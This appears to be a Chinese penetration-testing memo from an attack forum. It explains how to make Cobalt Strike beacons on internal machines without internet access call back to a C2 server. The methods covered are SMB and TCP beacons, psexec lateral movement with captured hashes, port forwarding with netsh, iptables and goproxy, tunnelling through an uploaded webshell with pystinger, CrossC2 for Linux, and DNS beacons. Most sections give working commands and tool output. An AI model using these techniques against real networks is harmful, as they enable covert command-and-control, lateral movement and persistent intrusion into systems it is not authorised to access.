常见不出网情况下，上线CS的方式，作为一个备忘录。

> 以下截图在不同时间/环境截取，IP会有些不同

0x01 存在一台中转机器
=============

存在一台中转机器，这台机器出网，这种是最常见的情况。

经常是拿下一台边缘机器，其有多块网卡，内网机器都不出网。这种情况下拿这个边缘机器做中转，就可以上线。

拓扑大致如下:

![image-20220516141642261.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-579e711ed3faf4f28d1c368eea5f2550b96ca485.png)

上线方法一： SMB Beacon
-----------------

### 介绍

官网介绍：SMB Beacon使用命名管道通过父级Beacon进行通讯，当两个Beacons连接后，子Beacon从父Beacon获取到任务并发送。

因为连接的Beacons使用Windows命名管道进行通信，此流量封装在SMB协议中，所以SMB Beacon相对隐蔽，绕防火墙时可能发挥奇效。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-1cc828a1586d0d6a6317f9c7518bda1d134aa9cf.png)

### 使用

**这种Beacon要求具有SMB Beacon的主机必须接受端口445上的连接。**

派生一个SMB Beacon方法：在Listner生成SMB Beacon&gt;目标主机&gt;右键&gt; spawn &gt;选中对应的Listener&gt;上线

或在Beacon中使用命令spawn smb（smb为我的smb listener名字）

![image-20220421232107035.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-6082e074f0eb511c21f63f1aa5db328069107489.png)

使用插件，或自带端口扫描，扫描内网机器

![image-20220421234112584.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-fb7a45bbfb24e146e56b8f0d07f3fb9cbe5e22bd.png)

转到视图，选择目标

![image-20220421234143265.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-1f23c804f04cda3e82932c3fd5d0ecfc273163d4.png)

使用psexec

![image-20220421234333884.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-6bc28eff9b9b14e366712727732eeaa8e32f75a9.png)

选择一个hash，选择smb 监听器和对应会话

![image-20220421234419445.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-eeda941c8ec9c5f55e3a7ecf9f8d01245c125e66.png)

即可上线

![image-20220422000337348.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-8aad5b074d56598abe67cd9d454a8a0af59222e6.png)

![image-20220422000428622.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-58882a221daca54402b87f8dca102f88bb35a43f.png)

运行成功后外部可以看到∞∞这个字符，这就是派生的SMB Beacon。

当前是连接状态，你可以Beacon上用link &lt;ip&gt;命令链接它或者unlink &lt;ip&gt;命令断开它。

![image-20220422000410651.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-3750906357942624c44c59454ddb53d7401dd366.png)

![image-20220422000458483.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-1853aba6a5df8e8d66b9d22d7b02975b7b189a62.png)

这种Beacon在内网横向渗透中运用的很多。在内网环境中可以使用ipc $生成的SMB Beacon上传到目标主机执行，但是目标主机并不会直接上线的，需要我们自己用链接命令(link &lt;ip&gt;)去连接它。

### 上线方法二：中转listener(Reverse TCP Beacon)

其实和方法一是类似的

![image-20220422000759017.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-27ae593015214b850f2dbbf8c4507c23c5a9f13e.png)

以下内容会自动配置

![image-20220422000840172.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-f687e3df1a78a8059ab08b5a1bb7245012285ae0.png)

然后和上面方法一一样，发现内网主机且知道账号密码,psexec横向传递，选择中转listener

![image-20220422001158730.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-e8016d4d1905f53aa758d9fb06c37121465b3d50.png)

![image-20220422001452245.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-b4431393de573e309f09a1d8b2dbc21429b6567f.png)

![image-20220422000337348.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-8aad5b074d56598abe67cd9d454a8a0af59222e6.png)

上线方法三：HTTP 代理
-------------

> 中转机器不需要上线即可

使用goproxy项目做代理，项目地址：

```php
https://github.com/snail007/goproxy
```

**过程：**

1.上传proxy.exe到web服务器(边缘主机)，在8080端口开启http代理

```php
C:\proxy.exe http -t tcp -p "0.0.0.0:8080" --daemon
```

2.用netsh命令将访问内网ip 192.168.111.131的822端口(必须为未使用的端口，否则会失败)的流量重定向到外网ip 192.168.1.88的8080端口

```php
netsh interface portproxy add v4tov4 listenaddress=192.168.111.131 listenport=822 connectaddress=192.168.1.88 connectport=8080
```

![image-20220516145111513.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-6bb51573d25019663d43299b908d1b604085742c.png)

3.创建listener，配置如下

![image-20220516163325095.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-04040e718448c2af33cd8878b36c543896b27bb4.png)

4.生成stageless payload，在业务服务器上执行，成功上线

![image-20220516163441748.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-baac259e559d19e45d032c8f0ff842be28b20e79.png)

连接过程

```php
192.168.111.236  → 192.168.111.131:822→ 192.168.1.88:8080→ C2(192.168.1.89)
```

上线方法四、TCP Beacon(正向)
--------------------

- 正向连接
- 和SMB Beacon比较类似。也需要一个父beacon
- SMB Beacon，TCP Beacon 与 Cobalt Strike 中派生 payload 的大多数动作相兼容。除了一些 要求显式 stager 的用户驱动的攻击（比如： Attacks → Packages 、 Attacks → Web Drive-by ）。

测试：

生成一个tcp beacon

![image-20220424145301486.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-d91c15438879e32026d82a6095a3d1ea3a8698ec.png)

使用该beacon生成一个stageless形式的木马：

![image-20220424145438941.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-cb655d4b61bc2a9b7cfdd57cc6e385da93e492c9.png)

上传到目标机器运行：

![image-20220424150129703.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-52855ea0f5f5773f6d6c9a2a1624031e81437553.png)

在中转机器的Beacon里使用`connect [ip address] [port]`命令进行正向连接，即可上线：

![image-20220424150307350.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-b6c2866c22a707a958dcf7255a5f2b807542e883.png)

要销毁一个 Beacon 链接，在父会话或子会话的控制台中使用 unlink \[ip address\] \[session PID\] 。以后，你可以从同一主机（或其他主机）重新连接到 TCP Beacon。

![image-20220424150527311.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-f85a5f793557420d1b84028eb308b039088dca93.png)

上线方法五、使用pystinger进行代理转发
-----------------------

pystinger的详细使用 见下面章节。 这里仅简单演示一下：

> 一般不会将pystinger用在这种场景下

**测试环境：**

攻击机kali：192.168.1.35

web服务器：192.168.1.70、192.168.111.129

业务服务器：192.168.111.236

**过程：**

1.上传proxy.php到WEB服务器网站目录，正常访问返回UTF-8

web服务器外网ip为192.168.1.70

![image-20220517181300013.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-526ac95e9ac5479caca8ecd91938b2377b46a0f2.png)

上传stinger\_server.exe，执行

```php
start stinger_server.exe 0.0.0.0
```

攻击机(192.168.1.89)上执行

```php
./stinger_client -w http://192.168.1.70/proxy.php -l 127.0.0.1 -p 60000
```

此时已经将web服务器的60020端口转发到vps的60020端口上了

CS设置监听,`HTTP Hosts`为中转机器的内网ip，端口为60020：

![image-20220517181223593.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-39fef2eab97f8de9a58087c3019bdc96c6e78831.png)

使用psexec横向移动，选择listener为pystinger，或者直接生成payload在业务主机执行，业务内网主机192.168.111.236即可成功上线：

![image-20220517182051748.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-00a1eb6398d789d33de19c773732b7c5b93b5cdc.png)

![image-20220517181145075.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-a15c80ddf9b4b504f229f09054527ab06002bbfa.png)

补充：中转机器为Linux
-------------

### HTTP代理(中转机器不需要上线即可)

使用方法与上面方法三一样。只不过要使用iptables转发：

```php
echo 1 >/proc/sys/net/ipv4/ip_forward
```

```php
iptables -A PREROUTING -p tcp -d 192.168.111.131 --dport 822 -j DNAT --to-destination 192.168.1.88:8080

iptables -A POSTROUTING -p tcp -d 192.168.1.88 --dport 8080 -j SNAT --to-source 192.168.111.131

```

**测试：**

中转机器(192.168.111.142)

![image-20220423214555465.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-1c70fe51e413d29ff29bd6ae1e071d21089a8975.png)

攻击机

![image-20220423222203087.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-182a8d8eac6e9fe1619d7af315c42b27cc3c2e9c.png)

生成stageless payload，在目标机器上执行，成功上线

![image-20220423222359445.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-9d99453e1bd260799e984347d086c0dc62bbb6e5.png)

![image-20220423222645751.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-58cf98e2a27c2bf2adde6886a5409bdc756c35ba.png)

连接过程：(重新截的图，端口改了一下8080-&gt;8081)

![image-20220423222847432.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-7592f4c753fee3642d0cb4c3fa53407531073d88.png)

192.168.111.140 → 192.168.111.142:8080→ 192.168.111.142:8081→ 192.168.111.131:81(C2)

### 使用pystinger进行代理转发

和上面`上线方法五`一样，建立pystinger连接之后，直接生成payload在业务主机执行，业务内网主机192.168.111.236即可成功上线。。

### CrossC2

> 通过其他机器的Beacon可以直接上线Linux机器
> 
> ![image-20220424110511841.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-bf4ee044f3174bfbb78e692622045bfde9d55753.png)

**CrossC2使用**

用来上线Linux或MacOS机器

项目地址： 【**一定要下载对应版本的**】

```php
https://github.com/gloxec/CrossC2
```

配置：

(我这里在Windows上运行的teamserver)

![image-20220517214639195.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-d6a159b37d9d48fb2139d1948c62a449bb494b86.png)

创建个https监听：

![image-20220517215034645.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-423e6b56538695eb1ebbcf365dd40370dffa0697.png)

生成个payload

(用其他方式也可以)

![image-20220517215228811.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-944cd094ad35dd5b2b168b50900a1c9806b1db63.png)

![image-20220424104455547.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-7b32e307191462ae78832a8efe834ea5497f5f3d.png)

![image-20220424104411307.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-0593099245210abb37014cb37fd9219310d6bacc.png)

> 如果生成不了，也可以直接命令行生成
> 
> ![image-20220517221232018.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-726bc946695f470e7e228a3f6d2e943991bbdf0f.png)

生成之后，上传到Linux机器，运行，即可上线：

![image-20220517221438333.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-c859ce48b686187ce7306f8cb190772756be0754.png)

![image-20220517221454859.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-890ccf50a6c149d0eebb4d6893274f3280378455.png)

安装CrossC2Kit插件，丰富beacon的功能

![image-20220517222854932.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-6d488f761d6c0e8c27b18945f3fa350634f16a47.png)

![image-20220517222935500.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-720cff7c3be5f970d8d8e84ea19b4f2a659feccb.png)

**内网机器上线CS:**

中转的Linux机器上线之后，即可用上面的方法来上线内网机器。

**TCP Beacon：**

![image-20220517224718810.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-e2ccafb1df0f48897aac05ac5b6b358c40397c9e.png)

![image-20220517224749945.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-95e8872c9cf1bad4db6e8e12421aeba8fb9e4f19.png)

上传到目标机器运行。

然后在Linux beacon下连接：

![image-20220517225035484.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-83de68e6601c99b216401cb8a87c448444ffabaa.png)

上线之后是个黑框，`checkin`一下就可以了

> **还是建议使用上面两种方法。**

0x02 边缘机器只有DNS协议出网
==================

DNS上线CS
-------

### 一、准备工作

1）域名 ，godaddy ：yokan.xxx  
2）vps，防火墙开放UDP端口53 : 82.xxx.xxx.19

![image-20220518120029278.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-11a6ea48f069b1d7b32b5a94591bab63f44112dc.png)

3）cobalt strike 4.1

### 二、域名设置

1）设置解析

配置A记录设置成vps的ip，cs也配置在vps上

![image-20220518121450765.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-1ca550e18b23eb5bd94f3360299c1b4c34f9f32a.png)  
配置几个ns记录 指向刚刚A记录对应的域名

![image-20220518122329148.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-12ad41ca451f20d3868d2fe412f55322d0a88d14.png)

配置完成之后`ping test.yokan.xxx`可以ping通  
![image-20220518122521793.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-5beb6d79f49c74848595c226a31c1a14c9be3244.png)

vps上查看53端口占用情况，停掉vps的53端口服务  
![image-20220518122733717.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-65dd2fe931a59949f92b3b45b40958c4cabeeccb.png)

`systemctl stop systemd-resolved`

![image-20220518122856917.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-3dcecedd39a9982326ec707dc4e3f15de493358c.png)

![image-20220518122842743.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-7efcf27aaeea4e2ae99fcf65c854afaac3472c9a.png)

2）cs设置监听

![image-20220518123540718.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-1c19bc2bdc5e80c97eec4e47b10db9b2f47376fc.png)!\[image-

都是ns记录的域名，DNS Host(Stager)随便选择其中一个就可以。

![image-20220518123718604.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-227f36a8be47e865279edc8d18b6b797c11dade9.png)

3）nslookup查看 ，成功解析：

![image-20220518123921308.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-3598cf79da3e3257bdb19f4b55c6d8cfcfe11a3c.png)

注意：响应的地址74.125.196.113，这个是跟profile里设置的

![image-20220518124037907.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-13d977895023b34bad7d93b8571b30a0adfddcb8.png)

### 三、cs上线

生成cs的stageless上线马，执行上线

> stageless 马 dns有x64版本 , stager没有
> 
> ![image-20220518125111240.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-4677a13a1203ddf82da2fa807602c8f4ce691100.png)

![image-20220518124359454.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-67c53c9290a276142265826ece960a3959a7bd4c.png)

上线之后是黑框，需要使用`checkin`命令让dns beacon强制回连teamserver

![image-20220518124416459.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-13afd46b895a23e3e1d71887e8c24511fc985e93.png)

> PS:需要多等一会

![image-20220518125128422.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-fef03f257c5ec7104ed2a003ba1d6dbb390be7fa.png)

这样就可以正常交互了：

![image-20220518124700940.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-d15008385a62fca3295e77eb0afc7135d5427426.png)

0x03 边缘机器不出网
============

方法一、TCP Beacon 正向连接
-------------------

&lt;font color='red'&gt;应用场景：边缘机器各种协议均不出网，但是可以正向访问到。&lt;/font &gt;

使用：

先让自己的攻击机上线

![image-20220424163629329.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-d7916b62320fbacaf4dcac5b9fb639107810de0d.png)

然后，如"**上线方法四**"一样，使用TCP Beacon生成一个stageless形式的木马，上传到目标机器，并运行。

![image-20220424163851956.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-212e879ece3538122d8b6b3b429120d76edcede1.png)

在攻击机(中转机器)的Beacon里使用`connect [ip address] [port]`命令进行正向连接，即可上线：

![image-20220424164004378.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-6613b411401470a7cd57fa516ef52dce93615d97.png)

方法二、使用pystinger(毒刺)工具
---------------------

&lt;font color='red'&gt;应用场景：边缘机器各种协议均不出网，但是存在web服务，已经拿到webshell。&lt;/font &gt;

项目地址:

```php
https://github.com/FunnyWolf/pystinger
```

简单原理：

**`Pystinger`来实现内网反向代理，利用http协议将目标机器端口映射至cs服务端监听端口，能在只能访问web服务且不出网的情况下可以使其上线cs**

![image-20220517174612140.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-ca95db018f056d23e762e53c4168837367434564.png)

### 使用

地址:

```php
https://github.com/FunnyWolf/pystinger/blob/master/readme_cn.md
```

这里直接复制过来了：

> 假设不出网服务器域名为 [http://example.com:8080](http://192.168.3.11:8080/) ,服务器内网IP地址为192.168.3.11

#### **SOCK4代理**

- proxy.jsp上传到目标服务器,确保 <http://example.com:8080/proxy.jsp> 可以访问,页面返回 `UTF-8`
- 将stinger\_server.exe上传到目标服务器,蚁剑/冰蝎执行`start D:/XXX/stinger_server.exe`启动服务端

> 不要直接运行D:/XXX/stinger\_server.exe,会导致tcp断连

- vps执行`./stinger_client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 -p 60000`
- 如下输出表示成功

```php
root@kali:~# ./stinger_client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 -p 60000
2020-01-06 21:12:47,673 - INFO - 619 - Local listen checking ...
2020-01-06 21:12:47,674 - INFO - 622 - Local listen check pass
2020-01-06 21:12:47,674 - INFO - 623 - Socks4a on 127.0.0.1:60000
2020-01-06 21:12:47,674 - INFO - 628 - WEBSHELL checking ...
2020-01-06 21:12:47,681 - INFO - 631 - WEBSHELL check pass
2020-01-06 21:12:47,681 - INFO - 632 - http://example.com:8080/proxy.jsp
2020-01-06 21:12:47,682 - INFO - 637 - REMOTE_SERVER checking ...
2020-01-06 21:12:47,696 - INFO - 644 - REMOTE_SERVER check pass
2020-01-06 21:12:47,696 - INFO - 645 - --- Sever Config ---
2020-01-06 21:12:47,696 - INFO - 647 - client_address_list => []
2020-01-06 21:12:47,696 - INFO - 647 - SERVER_LISTEN => 127.0.0.1:60010
2020-01-06 21:12:47,696 - INFO - 647 - LOG_LEVEL => INFO
2020-01-06 21:12:47,697 - INFO - 647 - MIRROR_LISTEN => 127.0.0.1:60020
2020-01-06 21:12:47,697 - INFO - 647 - mirror_address_list => []
2020-01-06 21:12:47,697 - INFO - 647 - READ_BUFF_SIZE => 51200
2020-01-06 21:12:47,697 - INFO - 673 - TARGET_ADDRESS : 127.0.0.1:60020
2020-01-06 21:12:47,697 - INFO - 677 - SLEEP_TIME : 0.01
2020-01-06 21:12:47,697 - INFO - 679 - --- RAT Config ---
2020-01-06 21:12:47,697 - INFO - 681 - Handler/LISTEN should listen on 127.0.0.1:60020
2020-01-06 21:12:47,697 - INFO - 683 - Payload should connect to 127.0.0.1:60020
2020-01-06 21:12:47,698 - WARNING - 111 - LoopThread start
2020-01-06 21:12:47,703 - WARNING - 502 - socks4a server start on 127.0.0.1:60000
2020-01-06 21:12:47,703 - WARNING - 509 - Socks4a ready to accept
```

- 此时已经在vps`127.0.0.1:60000`启动了一个`example.com`所在内网的**socks4a**代理
- 此时已经将目标服务器的`127.0.0.1:60020`映射到vps的`127.0.0.1:60020`

#### **cobalt strike单主机上线**

- proxy.jsp上传到目标服务器,确保 <http://example.com:8080/proxy.jsp> 可以访问,页面返回 `UTF-8`
- 将stinger\_server.exe上传到目标服务器,蚁剑/冰蝎执行`start D:/XXX/stinger_server.exe`启动服务端

> 不要直接运行D:/XXX/stinger\_server.exe,会导致tcp断连

- stinger\_client命令行执行`./stinger_client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 -p 60000`
- 如下输出表示成功

```php
root@kali:~# ./stinger_client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 -p 60000
2020-01-06 21:12:47,673 - INFO - 619 - Local listen checking ...
2020-01-06 21:12:47,674 - INFO - 622 - Local listen check pass
2020-01-06 21:12:47,674 - INFO - 623 - Socks4a on 127.0.0.1:60000
2020-01-06 21:12:47,674 - INFO - 628 - WEBSHELL checking ...
2020-01-06 21:12:47,681 - INFO - 631 - WEBSHELL check pass
2020-01-06 21:12:47,681 - INFO - 632 - http://example.com:8080/proxy.jsp
2020-01-06 21:12:47,682 - INFO - 637 - REMOTE_SERVER checking ...
2020-01-06 21:12:47,696 - INFO - 644 - REMOTE_SERVER check pass
2020-01-06 21:12:47,696 - INFO - 645 - --- Sever Config ---
2020-01-06 21:12:47,696 - INFO - 647 - client_address_list => []
2020-01-06 21:12:47,696 - INFO - 647 - SERVER_LISTEN => 127.0.0.1:60010
2020-01-06 21:12:47,696 - INFO - 647 - LOG_LEVEL => INFO
2020-01-06 21:12:47,697 - INFO - 647 - MIRROR_LISTEN => 127.0.0.1:60020
2020-01-06 21:12:47,697 - INFO - 647 - mirror_address_list => []
2020-01-06 21:12:47,697 - INFO - 647 - READ_BUFF_SIZE => 51200
2020-01-06 21:12:47,697 - INFO - 673 - TARGET_ADDRESS : 127.0.0.1:60020
2020-01-06 21:12:47,697 - INFO - 677 - SLEEP_TIME : 0.01
2020-01-06 21:12:47,697 - INFO - 679 - --- RAT Config ---
2020-01-06 21:12:47,697 - INFO - 681 - Handler/LISTEN should listen on 127.0.0.1:60020
2020-01-06 21:12:47,697 - INFO - 683 - Payload should connect to 127.0.0.1:60020
2020-01-06 21:12:47,698 - WARNING - 111 - LoopThread start
2020-01-06 21:12:47,703 - WARNING - 502 - socks4a server start on 127.0.0.1:60000
2020-01-06 21:12:47,703 - WARNING - 509 - Socks4a ready to accept
```

- cobalt strike添加监听,端口选择输出信息`RAT Config`中的Handler/LISTEN中的端口(通常为60020),beacons为**127.0.0.1**
- 生成payload,上传到主机运行后即可上线

#### **cobalt strike多主机上线**

- proxy.jsp上传到目标服务器,确保 <http://example.com:8080/proxy.jsp> 可以访问,页面返回 `UTF-8`
- 将stinger\_server.exe上传到目标服务器,蚁剑/冰蝎执行
    
    ```php
    start D:/XXX/stinger_server.exe 192.168.3.11
    ```
    
    启动服务端

> 192.168.3.11可以改成0.0.0.0

- stinger\_client命令行执行`./stinger_client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 -p 60000`
- 如下输出表示成功

```php
root@kali:~# ./stinger_client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 -p 60000
2020-01-06 21:12:47,673 - INFO - 619 - Local listen checking ...
2020-01-06 21:12:47,674 - INFO - 622 - Local listen check pass
2020-01-06 21:12:47,674 - INFO - 623 - Socks4a on 127.0.0.1:60000
2020-01-06 21:12:47,674 - INFO - 628 - WEBSHELL checking ...
2020-01-06 21:12:47,681 - INFO - 631 - WEBSHELL check pass
2020-01-06 21:12:47,681 - INFO - 632 - http://example.com:8080/proxy.jsp
2020-01-06 21:12:47,682 - INFO - 637 - REMOTE_SERVER checking ...
2020-01-06 21:12:47,696 - INFO - 644 - REMOTE_SERVER check pass
2020-01-06 21:12:47,696 - INFO - 645 - --- Sever Config ---
2020-01-06 21:12:47,696 - INFO - 647 - client_address_list => []
2020-01-06 21:12:47,696 - INFO - 647 - SERVER_LISTEN => 127.0.0.1:60010
2020-01-06 21:12:47,696 - INFO - 647 - LOG_LEVEL => INFO
2020-01-06 21:12:47,697 - INFO - 647 - MIRROR_LISTEN => 192.168.3.11:60020
2020-01-06 21:12:47,697 - INFO - 647 - mirror_address_list => []
2020-01-06 21:12:47,697 - INFO - 647 - READ_BUFF_SIZE => 51200
2020-01-06 21:12:47,697 - INFO - 673 - TARGET_ADDRESS : 127.0.0.1:60020
2020-01-06 21:12:47,697 - INFO - 677 - SLEEP_TIME : 0.01
2020-01-06 21:12:47,697 - INFO - 679 - --- RAT Config ---
2020-01-06 21:12:47,697 - INFO - 681 - Handler/LISTEN should listen on 127.0.0.1:60020
2020-01-06 21:12:47,697 - INFO - 683 - Payload should connect to 192.168.3.11:60020
2020-01-06 21:12:47,698 - WARNING - 111 - LoopThread start
2020-01-06 21:12:47,703 - WARNING - 502 - socks4a server start on 127.0.0.1:60000
2020-01-06 21:12:47,703 - WARNING - 509 - Socks4a ready to accept
```

- cobalt strike添加监听,端口选择RAT Config中的Handler/LISTEN中的端口(通常为60020),beacons为192.168.3.11(example.com的内网IP地址)
- 生成payload,上传到主机运行后即可上线
- 横向移动到其他主机时可以将payload指向192.168.3.11:60020即可实现出网上线

#### **定制Header及proxy**

- 如果webshell需要配置Cookie或者Authorization,可通过--header参数配置请求头

```php
--header "Authorization: XXXXXX,Cookie: XXXXX"
```

- 如果webshell需要通过代理访问,可通过--proxy设置代理

```php
--proxy "socks5:127.0.0.1:1081"
```

### 测试

> 攻击机：192.168.1.89

假设我们在拿下一台目标主机，但是无法连接外网。

![image-20220517144317558.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-61d2c20e1720d0a23cf127b936fbf37dca5c1d84.png)

使用 `pystinger` 工具进行 CS 上线，[下载地址](https://github.com/FunnyWolf/pystinger)，通过 `webshell` 实现内网 `SOCK4` 代理，端口映射可以使目标不出网情况下在 CS 上线。

首先上传对应版本脚本到目标服务器。

![image-20220517144354177.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-e496211d549982abfba616ef4bd8ee340d83d63a.png)

将`stinger_server.exe`上传到目标服务器,蚁剑/冰蝎执行`start stinger_server.exe`启动服务端

![image-20220517144723957.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-a45b0b8fd49198e4add9ce18cdaafd63532a2734.png)

![image-20220517144741452.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-ec141dd57127855b4e18376b4078fd7981f1281d.png)

把 `stinger_client` 上传到 `teamserver` 服务器，-w 指定 proxy 的 url 地址运行。

```shell
chmod +x stinger_client
./stinger_client -w http://192.168.1.70/proxy.php -l 127.0.0.1 -p 60000
```

![image-20220517144922515.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-2d68427a1c188c21ea017664fa7cb5357d901916.png)

CS 新建监听器，设置为目标机器的内网 IP，端口默认 60020。(teamserver 服务器和执行 stinger\_client 应为同一台服务器)

![image-20220517145024937.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-e11d81e4c320dafbce590920ee11567494643325.png)

生成木马，上传目标服务器并执行。可看到 CS 有新上线主机。

![image-20220517145046489.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-7efe9293b36ca40d7ef6dea03475dd9c0ee4f431.png)